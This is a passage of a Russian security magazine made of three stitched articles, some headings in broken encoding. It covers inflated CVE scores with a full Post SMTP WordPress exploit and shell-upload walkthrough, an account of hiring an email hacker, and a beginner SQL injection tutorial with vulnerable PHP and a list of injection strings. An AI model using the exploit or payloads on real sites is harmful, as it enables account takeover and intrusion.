Что бы уязвимость счи талась таковой, она дол жна нарушать по крайней мере
один аспект три ады CIA.



Анализируя CVE, я сталкиваюсь с тре мя основными проблемами:
 • CVE без экс пло итов;
 • CVE с неработающи ми эксплоитами;
 • завышенная оценка.

Моя тема — это веб-уязвимости, поэтому и при меры буду приводить из этой
области. Но схо жие проб лемы наверняка зат рагивают и другие сфе ры.


CVE-2023-39526: «óÿçâèìîñòü» â PrestaShop
Хороший при мер первой и третьей проб лемы — это CVE-2023-39526, уяз-
вимость в веб-при ложе нии PrestaShop. Мы видим две оценки: NIST дал оцен-
ку 9.8, в то вре мя как GitHub — 9.1.
  Почему оценки разные? Есть два различия: в NIST указали требуемые при-
вилегии как отсутствующие (None), в то время как сотрудники GitHub указали
высокие (High); в NIST отметили область как неизмененную (Unchanged), в то
вре мя как на GitHub выбрана изменен ная (Changed).
   Графа «Требуемые при виле гии» показы вает, какие привилегии необ-
ходимы атакующему для эксплуата ции уяз вимос ти. Область определяет,
может ли атакующий после эксплуатации уяз вимос ти выполнить эскалацию
при виле гий в любой форме. Под эскалацией при вилегий я подразумеваю
не толь ко переход от пользователя к администра тору, но и получе ние более
широкого дос тупа в системе, например от веб-при ложе ния к серверу.
   Итак, я уста новил уязвимый продукт. Для доступа к функции, где существу-
ет «уяз вимость», нуж но быть администратором, поэтому требуемые привиле-
гии высоки. Сама уязвимость пред ставляет собой удаленное выполнение
кода (Remote Code Execution, RCE), а не SQL-инъекцию. PrestaShop включает
в себя SQL Manager, поэто му сооб щать об SQL-инъекции без какой-либо тех-
ники обхода SQL Manager некор ректно.





Те перь давай глянем патч.





В пат че запросы DUMPFILE и OUTFILE добавлены в черный список в фай ле
RequestSql.php, а в Db.php появилась допол нительная проверка на то, есть
ли  они  в  запросе.  Если  да,  то  программа  выдаст  исключение
PrestaShopDatabaseException.
  Проблема здесь в том, что эти SQL-зап росы обя зательно должны исполь-
зоваться с зап росом INTO. INTO уже находится в черном списке, так что тех-
нически уязвимос ти нет; это прос то хорошая прак тика. Ни один из аспектов
триады CIA не нарушен, так как DUMPFILE и OUTFILE невозможно исполь-
зовать. Оценка этой «уяз вимос ти» должна быть 0.


CVE-2023-6875: áàã â Post SMTP Mailer
Не дав но  я  наткнулся  на  занимательную,  на  мой  взгляд,  новость:
«150 000 сай тов на WordPress в опас ности из-за багов в плагине Post SMTP
Mailer». Но в реаль ности эта уязвимость не экс плуатируется, так как пуб-
личный экспло ит кри вой.
   WordPress — это популярная система управления контентом, которая поз-
воля ет создавать сай ты без обладания глубокими техничес кими знаниями.
Сог ласно данным W3Techs, 43,1% всех веб-сай тов в интерне те соз даны
на WordPress. На нем работа ют некото рые СМИ и пра вительственные сайты.
Для WordPress есть масса плагинов, некоторые из них очень и очень популяр-
ны.
   Post SMTP Plugin добавляет в WordPress новые возможности, свя занные
с отправкой элек тронных писем. У него 11 мил лионов установок, из которых
более 300 тысяч активны.
  Я решил проверить, доступен ли пуб личный эксплоит для этой CVE,
и нашел один. Его опуб ликовал Улисс Сай ча (@UlyssesSaicha), тот же иссле-
дователь, что сооб щил об уяз вимости вмес те с Шоном Мерфи (Sean Murphy)
и опубликовал от чет в бло ге Wordfence. Сам экс пло ит доступен на GitHub. Вот
как он выглядит:


import requests
url = "http://localhost:10115" # Change this


# set fcm token
print("Setting the FCM Token")


request_url = f"{url}/wp-json/post-smtp/v1/connect-app"
request_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent":
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept":
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.
7", "Accept-Encoding": "gzip, deflate, br", "Connection": "close",
"fcm-token": "HelloWordfence", "device": "FakeDevice", "Content-Type"
: "application/x-www-form-urlencoded"}
requests.post(request_url, headers=request_headers)


# password reset
user_login = input("Username for password reset: ")
print("Attempting password reset")


request_url = f"{url}/wp-login.php?action=lostpassword"
request_headers = {"Cache-Control": "max-age=0",
"Upgrade-Insecure-Requests": "1", "Origin": f"{url}", "Content-Type":
"application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (
Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,
application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,
image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Referer": f"{url}/wp-login.php?action=lostpassword",
"Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;
q=0.9", "Connection": "close"}
request_data = {"user_login": "admin", "redirect_to": '', "wp-submit"
: "Get New Password"}
requests.post(request_url, headers=request_headers, data=request_data
)


# get logs array
print("Getting all email logs")


request_url = f"{url}/wp-json/post-smtp/v1/get-logs"
request_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent":
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept":
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.
7", "Accept-Encoding": "gzip, deflate, br", "Connection": "close",
"fcm-token": "HelloWordfence", "device": "FakeDevice"}
r = requests.get(request_url, headers=request_headers)
r = r.json()
print("Email logs: ")
for log in r["data"]:
print(f"Id: {log['id']}, Subject: {log['original_subject']},
Recipient: {log['to_header']}")



email_id = input("Select an email ID to view: ")  # Ask to select as
there may be other emails on the same testing environment
# see email data


request_url = f"{url}/wp-admin/admin.php?access_token=HelloWordfence&
type=log&log_id={email_id}"
request_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent":
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept":
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.
7", "Accept-Encoding": "gzip, deflate, br", "Connection": "close",
"fcm-token": "HelloWordfence", "device": "FakeDevice"}
r = requests.get(request_url, headers=request_headers)
print(r.text)

Этот  код  отправ ляет  запрос  на  /wp-json/post-smtp/v1/connect-app
с  заголов ками  "fcm-token":   "   HelloWordfence   ",   "device":
"FakeDevice", которые уста навливают токен HelloWordfence. Затем экспло-
ит зап рашивает имя пользователя, но незави симо от ответа будет исполь-
зоваться имя admin, что неверно. Потом код шлет запрос на сброс пароля,
пос ле чего сайт отправляет электрон ное письмо со ссыл кой.
  В итоге скрипт пытается получить все логи из /wp-json/post-smtp/v1/
get-logs с токеном, установленным в первом запросе, а затем запрашивает
иден тификатор лога, который нас интересует.
  Сама по себе уязвимость интерес ная, и большое спасибо иссле дова-
телям за то, что нашли ее. Но что до эксплоита, то за исключением проблемы,
когда он зап рашива ет имя пользователя (и при этом не использует его),
кажется, что чего-то не хватает. Что бы понять, чего именно, мы дол жны
задать себе вопросы: «Как стать адми нистра тором?», «Как узнать имя поль-
зователя для сброса пароля?», «Как получить шелл?»
   Когда я учился в школе, большинс тво воп росов на физике были о ситуации
в вакууме. В кибербезопасности мы называем это средой. Даже если экспло-
ит иде ально работает в нашей среде, это не зна чит, что он будет работать так
же на реальных целях. Поэто му я объясню про цесс, который отве чает на эти
вопросы, и напишу «бум-бум»-экспло ит при помощи ChatGPT. Я настроил
WordPress и уста новил уяз вимую версию Post SMTP 2.8.6.


Êàêîå èìÿ ïîëüçîâàòåëÿ ó àäìèíèñòðàòîðà?
Логич но предположить, что администра тором дол жен быть первый зарегис-
трирован ный поль зователь, поэто му, если мы отправим запрос на /wp-json/
wp/v2/users/1, мы должны уви деть имя пользовате ля админис тратора.
В некоторых случаях доступ к JSON-интерфейсу невозможен, и иногда это не
первый поль зователь. Если нет доступа к JSON API, наш экс плоит дол жен
использовать имя поль зователя admin.





В моем случае имя — tuktuk, но настоящее имя поль зователя (username) —
kali. Значит, экспло ит должен анализи ровать зна чение slug.


Çàáûëè ïàðîëü
Я не настроил SMTP в своей тестовой среде, поэто му, когда мы сбрасываем
пароль с именем пользователя, элек тронное пись мо не отправляется, но лог
неот прав ленного письма сохраняется. В логе есть информация о том, кто
отправил электронное письмо, кому оно отпра вилось или не отправилось,
дата и содер жание электронного письма. Внут ри пись ма — ссылка на сброс
пароля.





Ëîãè ýëåêòðîííîé ïî÷òû
Я отправил зап росы на установку нового токена, получе ние логов и вывод
пос леднего лога, который содержит ссылку на сброс пароля.





Я хочу прос мотреть  лог, в котором есть ссылка на сброс пароля, —
номер 154.





Èçìåíåíèå ïàðîëÿ
Я отправил зап рос на сброс пароля еще несколь ко раз, и теперь я смотрю
лог номер 158.





Открыв URL сбро са пароля, получаю куку вида wp-resetpass-md5(URL)=:
key, в моем случае она выг лядит так:


wp-resetpass-86a9106ae65537651a8e456835b316ab=kali:
GJbWFvh1nOj8GFg643x9

Здесь 86a9106ae65537651a8e456835b316ab — это хеш MD5 от адре са
http://localhost/, а GJbWFvh1nOj8GFg643x9 — ключ на сброс пароля
из ссыл ки. Эти дан ные нам особо не нужны, так как наш скрипт будет парсить
куки, но все же хорошо знать, что за хеш.





При сбросе пароля должны при сутство вать и куки, и ключ.





Çàãðóçêà øåëëà
Те перь все, что нам нужно сделать, — это вой ти в сис тему и загрузить zip-
файл, содер жащий шелл. В моем случае это файл 1.zip.





В нашем запросе есть nonce, referer, имя файла и содержимое.





Очевидно, наш файл — это не плагин, поэтому он будет сохранен в дирек-
тории /wp-content/upgrade/1.





Те перь у нас есть шелл.





ÁÓÌ-ÁÓÌ-ÝÊÑÏËÎÈÒ Ñ GPT

Я не разработ чик и не раз бира юсь в программи ровании, но это не зна чит,
что я не могу читать по-английски и отла живать ошиб ки. Экс плоит написан
на Go с помощью GPT-4.





Вот что делает этот экс пло ит:
 1. Устанав ливает токен, который поз воляет видеть почты.
 2. Находит юзернейм админа, если не может найти, то ставит «админ»
   как дефолт.
 3. Просит ссылку для сброса пароля, тогда письмо со ссыл кой идет админу.
 4. Берет токен, который поставил в первом пун кте, и смотрит логи почты.
 5. Берет самый пос ледний лог, в котором ссылка для сброса пароля.
 6. Сбра сывает пароль через ссылку, полученную в пятом пункте.
 7. Входит как админ.
 8. Заливает шелл (файл shell.zip, внут ри которого шелл).

Код ты можешь найти в моем репозитории на GitHub, видео с демонстра-
цией — на Imgur.


ÂÛÂÎÄÛ

Итак, мы разобрали два случая, ког да наличие CVE еще не значит, что баг
можно брать и экс плуатировать. В первом случае эксплуатация невозможна
в прин ципе, пос кольку баг — пус тышка. Во вто ром баг оказался интересным,
но отсутствовал работающий эксплоит. Я показал, как, поняв принцип уяз-
вимос ти, мож но написать свой экспло ит, причем прог рамми рование вполне
реально целиком сгрузить на искусственный интеллект.
ПРИВАТНОСТЬ





Однажды самый известный в нашей стра не
поч тальон по фамилии Печкин сказал: «Вот
до чего быва ют люди до чужого добра жад-
ные!» И он был прав, при чем не в пос-
леднюю очередь применительно к поль-            ShəLMā                                                                                         Киберпанк, технокрыс
зовательским учеткам. За минувший год      и просто мерзкая личность.                                                                                        schelma@protonmail.com
у дво их моих знакомых  уве ли  акка унты
в наибо лее популярной российской соц-
сети, а еще у тро их ломану ли электрон ную
поч ту. И я задумался: а сколько сейчас сто-
ит взлом поч тового ящика и каким образом
обыч но действуют злоумыш ленни ки?


Впро чем, совсем не обязательно гадать на кофейной гуще, если можно про-
вести натурный эксперимент. Я решил прикинуть ся простым обывателем
и поинтересовать ся у самих «специалис тов по взлому», в какую сумму они
оце нивают собственные услу ги, а заод но уточнить методы, которые они
используют. Сай тов, где предлагается взлом на заказ, в интерне те пруд пру-
ди: складывается ощу щение, что это не менее востребованная услу га, чем
ремонт бытовой техники, установка винды или устранение канализаци онных
засоров. Вот и посмотрим, насколько легко простому пареньку вроде меня
нанять персонального хакера для взло ма почтового ящи ка.
   Куда обращается обыч ный, не обременен ный интеллектом нужными свя-
зями пользователь интернета с запросом из серии «взломать электронную
почту сроч но без SMS регистрации»? Пра виль но, во всезнающий гуголь.
Отправился туда и я. От разнооб разия получен ных ссы лок буквально рябит
в глазах, да и сай ты по этим самым ссылкам раду ют интерес ным кон тентом.
Нап ример, авторы вот это го лендинга хвас таются тем, что при взломе почты
они исполь зуют «передовые технологии обо рудо вания от лучших произво-
дителей».





Не знаю, чем их оборудо вал лучший произво дитель, — воз можно, про фес-
сиональ ные хакеры име ют в виду, что родаки все-таки купили им новый ноут
за хорошие оценки в прошлой четверти.
  А вот настоящий сервис по взлому всего что угод но. «Мы груп па профес-
сиональ ных программистов или хакеров если так будет понятнее, — пишут
авто ры сай та. — Это поз воляет сокращать вре мя работы над заказом
и делать результаты, ког да банальные приемы взло ма не работаю»  (àð-
ôàãðà ôåÿ оригинала сохранена).





По нятнее некуда, осо бенно если нуж но сроч но делать результаты. Ведь
на эту хакерскую контору, если верить сай ту, работа ет «30 спе циалис тов име-
ющих опыт в различных отраслях социальной инже нирии» — веро ятно,
это специалис ты, которые получают инжир в рам ках какой-то социальной
программы. Раду ют и опубликованные на этой домашней стра нич ке правила
раз мещения заказа, в частнос ти такое: «Условия сотрудничес тва с нами:
не про сит встре че с исполнителем». Жаль, потому что на встрече можно
было бы как минимум подарить исполни телю орфографичес кий словарик
рус ского язы ка.





А вот еще один сайт, пред лагающий услуги подоб ного рода. Тут все очень
серьезно: под робно описаны виды пред лага емых работ, приведены отзывы
довольных кли ентов, име ется даже прейску рант, из которого следует, что
дешевле все го взло мать ящик, зарегистри рованный на сервисе  Mail.ru,
остальные рос сийские провайдеры оцениваются дороже, а взлом Gmail
и кор поратив ных ящиков на собственном домене так вообще стоит целое
состояние.





Есть  и  вовсе смешные  «сервисы»,  рассчи танные,  видимо,  на людей
с мякишем вместо головного моз га: вводим в соответству ющее поле нужный
нам адрес электро почты, жмем кнопку «Взло мать!», пос ле чего на экра не
появляет ся забавное JS-окошечко со всякими страш ными надписями вроде
«готовим сокет протоко ла для передачи данных», «опрашиваем порт канала
связи», «уста навливаем соеди нение с астральным поч товым сервером»,
«первичная инициализация», «вторич ная эпи ляция»… Затем, разумеется,
нуж но ввести данные банковской карты — ина че никакого чуда не произой-
дет.





Но мы люди серьезные и ответс твенные, поэтому на подоб ную ерунду
не ведем ся. Да и вообще, опубликован ные в интернете расценки и рек-
ламные посулы — это хорошо, но обещать — не значит жениться. В науч-
но-иссле довательских целях я зарегис трировал на Mail.ru новый почтовый
ящик, сразу же подписал его на несколь ко информационных рассылок, что бы
он не выглядел пустым и заб рошенным, пос ле чего с другого адре са отпра-
вил сообщения всем упомянутым мною хакерским сервисам (и еще трем
неупомянутым, но похожим). Легенда была прос тая: эта электронная почта
при надлежит моей девушке, с личной перепис кой которой я очень желаю
ознакомить ся — прямо аппетит потерял, хочу знать, с кем и о чем она
перепи сывается.





Из пяти отосланных сооб щений на два ник то не отве тил, в качес тве отклика
на еще одно пос тупил отлуп от майлердемона о том, что указанного ящи ка
не существует. Двое «хакеров» все-таки удо сужи лись черкануть мне пару
строк. Первый попросил за взлом ящи ка на Mail.ru десять тысяч рублей,
но  при  условиии  пятидесятипроцентной  пре доплаты  вне  зависи мос ти
от результата, что меня, понятное дело, не устроило.





Второй озвучил цену в 12 тысяч и сооб щил, что нужна предоплата, а остаток
вносить толь ко пос ле доказа тель ства успешного взлома — скриншота содер-
жимого инбокса. Поскольку фотошопить скриншоты я и сам неплохо умею, я
сог ласился на  это предложение с небольшой оговоркой:  я отправлю
на целевой адрес письмо с секретным словом, а взломщик пришлет мне его
скрин либо сооб щит код в переписке. Предоп лату пред ложил внес ти через
гаранта, после этого потенциальный исполнитель заказа ожидаемо слился.





Не добив шись успеха на публичных сайтах, я решил занырнуть в тем ные
и неизведанные глубины даркве ба. На одном из хакерских форумов нашел ся
тред с пред ложением услуг по взло му электрон ной почты. Я отправил автору
запрос, и тот откликнулся — да, взло мать ящик на Mail.ru возможно, сто-
имость услуги составляет 15 тысяч руб лей, опла та за результат, а для начала
необходимо сообщить все, что мне извес тно о вла дель це это го адреса. Чувс-
твуется серьезный и системный подход!





Часа через полтора пос ле того, как мы ударили по рукам, в целевой почтовый
ящик упало пер вое подозритель ное сообщение.





Письмо, что характерно, написа но на английском (видимо, исполнитель
решил поначалу не заморачивать ся) и содержало ссылку, по нажатию
на которую открылась вот такая очаровательная фишинговая фор ма, при чем
с забот ливо вве денным адресом электрон ной почты потен циальной жер-
твы — этот параметр передается странице в адресной строке браузе ра
в виде переменной и «спря тан» в самой ссылке.





                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ



          КАК Я НАНЯЛ ЗЛОГО ХАКЕРА ДЛЯ
         ВЗЛОМА ЭЛЕКТРОННОЙ ПОЧТЫ




Даже логотип подтянулся соответс твующий. Ну-ка, а если мы поменя ем в URL
фишин говой страницы имя пользователя и домен почтовой службы?





Пот рясающе: логотип меня ется автоматичес ки! При этом форма написана
на обфусцированном JavaScript, вве ден ный в нее пароль, судя по все му, сох-
раняется в файлик. А вот с наб ранным наугад доменом, не совпадающим ни с
одним популяр ным сервисом бесплатной почты, форма не справилась —
под ходящей картинки в запасе у жулика не наш лось.





Навер ное, какая-нибудь наивная девочка и впрямь могла бы клю нуть на такую
нехитрую наживку, но я посчитал, что моя выдуман ная под ружка по-английски
не понима ет, и высокомерно про игнориро вал это пись мо. Не получив дол-
гожданный пароль, на следующее утро взломщик прислал еще одно сооб-
щение.





Тут, судя по всему, предпри нята роб кая попытка адресной фишинговой атаки,
но не слиш ком удачная — из письма следовало, что получатель отправил
какой-то файл сам себе. Не знаю, на что рассчи тывал отправитель: если
адресат в своем уме и не стра дает алкогольной деменцией, он твердо знает,
что никаки ми файлами с собой уж точно не делился.





Тем более URL в адресной стро ке бра узера не име ет ничего общего
со стремным файлооб менни ком, страницу которого под делал злоумыш-
ленник, что само по себе выг лядит крайне подозрительно. В общем,
это письмо тоже полетело в кор зину. Однако вско ре во «Входящие» упало
еще одно.





А вот это уже вполне себе целевая фишинговая атака — во-первых, в пос-
лании использует ся лич ное приветс твие и имя «жертвы», что должно усыпить
ее бдительность. Во-вто рых, я сообщил исполнителю кое-какую допол-
нительную информа цию о получателе, в частности при думал для моей
несуществующей девушки место работы и должность (сот рудница отдела
персонала),  назвал  имя  начальницы  и  луч шей  подруги.  Отправитель
наконец-то решил пол ноценно использовать этот вектор ата ки, написав пись-
мо от име ни руково дительницы получа теля. При этом он точно не знал,
как при нято общаться в коллекти ве потен циальной жертвы, на ты или на вы,
ему неизвестен и стиль общения с под чиненной, поэтому письмо написано
сжато, ней трально и без использования лич ных местоимений. Отличная
работа!
   Если честно, я ожи дал прочитать очередную историю из разряда «срок
год ности вашей учетной записи истекает, скоро она испортится и начнет пло-
хо пах нуть, пора поменять пароль» и был при ятно удивлен. В письме обна-
ружилась ссылка на сайт, ими тиру ющий онлай новый таб личный редактор,
а там… Ну да, опять форма для ввода логина и пароля электронной почты,
без заполнения которой ты не уви дишь содержимое «таблицы».





Собс твенно, это первая более-менее серь езная попыт ка применить соци-
аль ную инженерию — исполнитель убедился, что жертва на примитивные ата-
ки не реаги рует, и решил взяться за нее всерьез. Наверное, на мес те девуш-
ки Марии я бы купился на такой хитрый фишинг. Но я совсем не девушка,
а злой и повидав ший некоторые sheets (в смысле лис ты Excel) кибер панк, так
что и это письмо я тоже проигно рировал. Фиг с ними, с сотрудни ками, пус кай
идут хоть в отпуск, хоть к черту на рога.
   Вскоре я получил следующее сообщение. И вновь — попытка таргетиро-
ванной фишин говой ата ки с использовани ем информации о получа теле,
на сей раз — от имени потенциального соискателя работы.





Ссылка в письме вела на фишинговый сайт yandeksdisk.org, косящий, как и
следовало ожидать, под Яндекс Диск, причем отправитель даже не удосужил-
ся замаскировать ссылку под нас тоящую. На этот ресурс меня не пустил бра-
узер, сообщив, что сайт рас простра няет вредоносное ПО (кто бы сом невал-
ся!), да и анти вирус на компь ютере начал истошно кричать о загрузке тро яна.
Однако я человек донельзя любопытный и, отклю чив защиту, все-таки щел-
кнул по ссылке — по этому URL заг ружа ется исполняемый файл с примеча-
тель ным расширени ем .pdf.exe. Впро чем, даже с отключенными пре дуп-
реждениями браузер все равно сообщает о том, что внут ри фай ла прячется
вре донос.





VirusTotal ожи даемо показал детект этого приложения практически всеми
актуальными антивирусами. Судя по все му, взлом щик пытался подсунуть мне
RAT с функциями кейлоггера и уда ленного администрирования.





К сло ву, письмо с вредонос ной ссыл кой успешно прошло все фильтры
Mail.ru — воз можно, потому, что было отправлено с обычного почтового ящи-
ка на другом пуб личном сервисе. Для ана лиза слу жебных заголов ков я вос-
поль зовался набором инструментов админис тратора Google — довольно
полез ный инструмент, избавляющий от необ ходимости ковыряться в хедерах
письма вручную.





Пос коль ку пароль жертва атаки в поддельную форму так и не ввела и трояна
на своей машине не запустила, на третий день поток фишинговых писем
прекратился, а исполни тель пропал с радаров.
  Вы воды в результате проведенного мною бес человечного эксперимента я
сде лал следующие. Во-первых, авторы размещенных в интернете страничек
с многочисленными предложениями взлома поч товых ящиков — обычные
мел кие жулики, пытающиеся нажиться на лопоухих заказчиках. Во-вторых,
дек ларируемые на таких сайтах расценки, как и обе щания работать без пре-
доп латы, — пол ная ерунда, реальные цены ощутимо выше, а денег у тебя,
скорее  все го,  поп росят  вперед  без  каких-либо  гарантий.  В-третьих,
более-менее адек ватного исполни теля можно найти раз ве что в даркне те,
и там сто имость подобных услуг начинается от 15 тысяч.
   Ну и наконец, основной используемый сей час метод взлома — социаль-
ная инже нерия, причем чем больше зло умышленни ку известно о жертве, тем
более таргетированной будет ата ка. При менять брут форс, особенно к ящи-
кам, зарегистрированным на пуб личных сервисах, бес полезно чуть менее
чем пол ностью, пос коль ку все современные почтовые служ бы имеют встро-
енную защиту от перебора паролей. Применяется, как мы видим, и вредонос-
ное ПО, но злодеи не заморачиваются даже тем, что бы накрыть тро яна упа-
ковщиком с целью сбить детект, — в результате вредоносную ссылку бло-
кирует браузер с настройками по умол чанию, а установленный на машине
анти вирус сразу же поднимает тревогу.
  В общем, если ты не наивный прос тачок, безответствен но переходящий
по ссыл кам в почтовых сооб щениях и вво дящий свой пароль куда ни попадя,
а также не отклю чаешь в своей системе антивирус ную защиту, опасаться осо-
бенно нечего. Сохраняй бди тельность, используй двухфакторную аутен-
тификацию, мой руки перед едой и вообще, как пел один популяр ный
исполни тель, следи за собой, будь осторожен. Тогда ни один хакер никогда
не доберется до твоей интимной переписки, как бы он ни старался.
ВЗЛОМ





В этой статье я раз беру тему SQL-инъекций
с самого начала — для тех, кто только осва-
ивается в мире инфосека. Мы пройдемся
по базовым уязвимос тям и пошагово раз-
берем нес ложные атаки. Потом поговорим               Sphinx                                                                                       Джуниор-пентестер
о sqlmap — инс трументе для авто матичес-           @Logovo_Sphinxa
кого пентеста SQLi. В конце пореко мендую
ресурсы для дальнейшего изучения.




                        Статья имеет озна комительный характер и пред-
                       назна чена    для    обу чения    спе циалистов
                      по  безопасности,  про водя щих  тес тирование
                        в рамках контракта. Автор и редакция не несут
                         ответствен ности за любой вред, при чиненный
                        с при менением изложенной информации. Рас-
                       простра нение вредоносных программ, наруше-
                      ние работы систем и нарушение тайны переписки
                      прес ледуются по закону.





Ес ли ты крутой пентестер и тема, о которой мы сегодня будем говорить,
для тебя неак туальна уже лет двад цать, то не волнуйся. «Хакер» обязательно
про должит радовать тебя хардкорными матери ала ми. Но мы буквально обя-
заны иметь и что-то для новичков. Да и о базовых вещах стоит время от вре-
мени писать заново, с учетом современ ных реалий.



×ÒÎ ÒÀÊÎÅ SQL?

SQL (Structured Query Language) — это язык прог рамми рования, который
почти повсеместно исполь зуется для работы с базами данных. В час тности,
он при гождается при разработке сай тов. Давай посмотрим, как выглядит
типич ный сце нарий его применения.
  Предположим, у нас есть интернет-магазин, тор гующий спор тивны ми
товарами, и поль зователь Васёк, желающий купить гантели.
 1. Васёк вводит в стро ку поиска слово «гантели» и нажимает «Искать».
 2. Когда кнопка нажата, браузер зап рашива ет стра ницу поиска и передает
   на сервер строку «гантели».
 3. Работающее на сервере веб-приложение, чтобы поис кать в базе данных,
  фор мирует запрос к ней. Для это го в приложение программистом заложе-
   на команда на SQL, задающая усло вия поис ка. В нее и под став ляется
   полученное от пользователя слово «гантели».
 4. Получив запрос, база данных ищет подходящие под условия строки в таб-
   лице товаров и выдает их веб-приложе нию.
 5. Веб-приложение объединяет результат поиска с шаблоном страницы
   и выдает результат браузеру Вась ка. Васёк видит красивую страничку
   с изображени ем гантелей, ценами и прочей инфой.

Что же такое база дан ных? Так час то называют, во-первых, саму программу,
работа ющую на сервере (точнее, она называется СУБД — система управле-
ния базами дан ных), а во-вторых, файл или несколько фай лов, в которых
в спе циальном формате хранят ся данные.
  Данные записы вают ся в виде таблиц, а в таб лицах — стол бцы и строки,
как в документе Excel. Зачас тую одна СУБД может управлять сразу несколь-
кими базами данных, каждая из которых уже содержит в себе таблицы.
  Ре комен дую поставить на свой компьютер любую СУБД и посмотреть
на нее поближе самостоятельно. Проще всего будет запустить SQLite , а для
прос мотра данных можешь воспользовать ся DB Browser. Более серьезные
СУБД вро де MySQL, PostgreSQL и Microsoft SQL Server устроены чуть слож-
нее, но смысл совер шенно тот же. И все они исполь зуют один язык зап-
росов — SQL (хоть и с небольшими раз личи ями).
  Но вернемся к Ваську. Что, если ему нуж ны вовсе не гантели, а, например,
данные других поль зователей или возможность зайти в админку сай та? Какой
запрос ему сделать тогда? Давай разбираться.


ÊÀÊ ÂÛÃËßÄÈÒ ÇÀÏÐÎÑ Ê ÏÐÈËÎÆÅÍÈÞ

Чаще всего  уязвимости типа SQLi возникают в поиске, комментариях
и панелях администрирова ния, так что Вась ку нужно внимательнее всего
смот реть на параметры, которые браузер переда ет на сервер при запол-
нении разных строк.
  Давай разберем вот такой запрос:


http://just_usual_site_with_sqli.com/tovar?id=drel

Это зап рос типа GET — ког да передаваемые параметры указываются прямо
в ссыл ке — пос ле знака вопроса. Здесь параметр id — это идентификатор
товара. Именно через этот параметр мы чуть поз же и попыта емся про извести
инъекцию.
  Нередко при меняются и зап росы типа POST, при которых параметры
передаются уже не в адресной строке, а в HTTP-заголовке. Запрос, сде лан-
ный методом POST, будет выг лядеть пример но так.





Здесь передается несколько параметров: postId, comment, name и другие.


ÏÐÎÕÎÄ Â ÀÄÌÈÍÊÓ

Те перь давай пос мотрим, как уязвимость будет выглядеть в коде веб-при-
ложения, которое Васёк пыта ется взломать. Для примера возьмем код
из финального экзамена HTB Academy SQLi Fundamentals.
  Предположим, мы наш ли адрес админки сайта, но, чтобы зайти туда, нам
нуж но ввести имя поль зователя и пароль. Вот кусок кода на PHP, который
по заданному име ни пользователя и паролю проверяет, есть ли в базе такая
пара:


$servername = "just_simple_server"
$username = "admin"; # Юзернейм
$password = "password123"; # Пароль
$dbname = "simple_database"


# Подключение к базе данных
$conn = new mysqli($servername, $username, $password, $dbname);


# Сюда приходит пользовательский ввод
$user_input_username = $_GET['username'];
$user_input_password = $_GET['password'];


# А здесь создается сам запрос в базу данных
# и подставляется то, что ввел пользователь
$sql = "SELECT * FROM users WHERE username = '$user_input_username'
AND password = '$user_input_password'";


$result = $conn->query($sql);


# Проверка результатов: нашлись ли в базе записи с нужными логином и
паролем
if ($result->num_rows > 0) {
    echo "Успешный вход";
} else {
    echo "Неверное имя пользователя или пароль";
}

Нам с тобой осо бенно интересна перемен ная $sql, именно в ней и будет
про исхо дить вся магия.





На русском этот запрос звучал бы так: «Выбери все строки из базы данных
users,  где имя пользователя — $user_input_username, а пароль —
$user_input_password». Причем вмес то наз ваний переменных в реальнос ти
будут подстав лены зна чения, введенные пользователем в форму.
  Сейчас мы с тобой проведем SQL-инъ екцию. Тут важно не заходить сразу
с козырей. В пер вую очередь нам надо передать кавычку, чтобы она закрыла
запрос и он не превратился в стро ку, как подразумевалось.
  Для начала надо определить, какие имен но кавычки стоят в коде: одинар-
ные или двойные (PHP допус кает оба вари анта). В нашем случае мы можем
пос мотреть код и ответить на этот воп рос: оди нарные. Но при настоящем
пентесте кода у нас, скорее всего, не будет, поэтому определять придется
самим — методом проб и ошибок. А точнее, методом перебора строк
по списку.




Я подготовил для тебя небольшой спи сок строк для перебора.


 '


 "
 #
 %'#
 %'--
 %')--
 %' or 1=1#
 %' or 1=1--
 %') or 1=1#
 %') or 1=1--
 ' or 1=1--
 ' or 1=1#
 ') or 1=1#
 ') or 1=1--
 %' and 1=1#
 %' and 1=1--
 %') and 1=1--
 %') and 1=1#
 ' and 1=1#
 ' and 1=1--
 ') and 1=1#
 ') and 1=1--
 %' or 2=2#
 %'or 33=33--
 %') or 55=55#
 %') or
 ord(5)=ord(5)--
 ' or 2=2#
 ' or 33=33--
 ') or 55=55#
 ') or ord(5)=ord(5)--
 %' and (chr('a')=chr('a'))#
 %'and 4=4--
 %') and (ASCII('a')=ASCII('a'))#
 %') and 'w'='w'--
 ' and(chr('a')=chr('a'))#
 ' and 4=4--
 ') and(ASCII('a')=ASCII('a'))#
 ')and 'w'='w'--




Допустим, мы опре дели ли, что в коде исполь зуются одинарные кавычки.
Отлично, значит, стро ку можно зак рыть, отправив в запросе оди нарную
кавыч ку! Но само по себе это нам никак не поможет, ведь после под становки
име ни пользовате ля получится вот такой код:


$sql = "SELECT * FROM users WHERE username = ''' AND password =
'$user_input_password'";

Пос ле нашей кавычки идет кавыч ка, которая изначально была в коде,
в результате SQL просто не пой мет, что это за нагромож дение кавычек,
и выдаст ошиб ку. Зап рошенная страница, скорее все го, не будет отображена
вовсе.
